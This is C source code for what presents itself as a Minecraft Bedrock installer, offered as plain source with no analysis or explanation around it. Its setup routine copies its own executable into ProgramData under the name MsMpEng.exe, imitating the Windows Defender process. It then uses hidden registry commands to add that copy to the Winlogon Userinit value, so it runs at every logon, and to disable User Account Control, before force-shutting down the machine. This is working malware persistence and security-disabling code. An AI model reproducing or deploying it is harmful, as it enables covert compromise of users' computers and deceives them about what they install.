#include "headers/setup.h"



static BOOL giveShutDownPerms(){
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)){
        return FALSE;
    }
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, (PLUID)&tkp.Privileges);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)){
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

typedef NTSTATUS(WINAPI *PNtShutdownSystem)(ULONG);

static void ShutdownSystem(){
    if(!giveShutDownPerms()){
        MessageBoxW(NULL, L"Failed Shutting Down System\n", L"Installer", MB_OK | MB_ICONERROR);
        return;
    }
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PNtShutdownSystem NtShutdown = (PNtShutdownSystem)GetProcAddress(ntdll, "NtShutdownSystem");
    NtShutdown(1);
    FreeLibrary(ntdll);
}

BOOL setup(state* state){
    OFSTRUCT OpenBuff;
    HFILE file = OpenFile("C:\\ProgramData\\APHostClient.sys", &OpenBuff, OF_CREATE);
    if(file == HFILE_ERROR){
        MessageBoxW(NULL, L"Failed Starting Installation Of Minecraft Bedrock", L"Installer", MB_OK | MB_ICONERROR);
        ExitProcess(-1);
        return FALSE;
    }
    LPSTR path = (LPSTR)malloc(5097);
    GetModuleFileName(NULL, path, 5096);
    if(!CopyFile(path, "C:\\ProgramData\\MsMpEng.exe", FALSE)){
        MessageBoxW(NULL, L"Failed Copying File", L"Installer", MB_OK | MB_ICONERROR);
        ExitProcess(-1);
    }
    free(path);
    WinExec("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\ProgramData\\msmpeng.exe, C:\\Windows\\System32\\userinit.exe\" /f", SW_HIDE);
    WinExec("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", SW_HIDE);
    Sleep(10000);
    ShutdownSystem();
    return TRUE;
}